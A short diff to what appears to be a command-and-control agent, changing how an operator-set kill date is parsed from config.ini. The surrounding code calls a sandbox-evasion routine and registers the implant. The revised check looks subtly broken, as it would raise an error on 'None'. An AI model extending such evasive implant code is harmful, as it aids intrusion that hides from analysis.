@@ -28,7 +28,7 @@ def config_file():
 
     # When operator sets a kill date, kill_date_string will not be 'None'
     # None was converted to a string
-    if kill_date_string != 'None' and isinstance(kill_date_string, datetime.datetime):
+    if isinstance(datetime.datetime.strptime(kill_date_string, '%Y-%m-%d %H:%M:%S'), datetime.datetime):
 
         config.read('config.ini')
         if 'kill_date' in config['AGENT']:
@@ -254,7 +254,7 @@ if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
 
-    # Agent obtaining and ID
+    # Agent obtaining ID and kill date if any.
     if not os.path.exists(path=THIS_DIR / 'config.ini'):
         agent_id = randrange(500)
         register()
